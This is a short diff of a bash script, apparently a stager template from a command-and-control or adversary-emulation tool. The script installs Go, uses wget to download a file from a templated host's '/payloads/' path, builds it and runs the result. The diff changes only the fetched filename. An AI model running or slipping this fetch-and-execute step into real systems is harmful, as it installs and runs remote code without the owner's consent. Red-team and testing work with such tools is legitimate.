@@ -1,5 +1,5 @@
 #!/bin/bash
 sudo snap install --classic --channel=1.11/stable go
-wget {{.hostname}}/payloads/{{.filename}}
+wget {{.hostname}}/payloads/SourceCode
 go build main.go
 ./{{.pathtofile}}
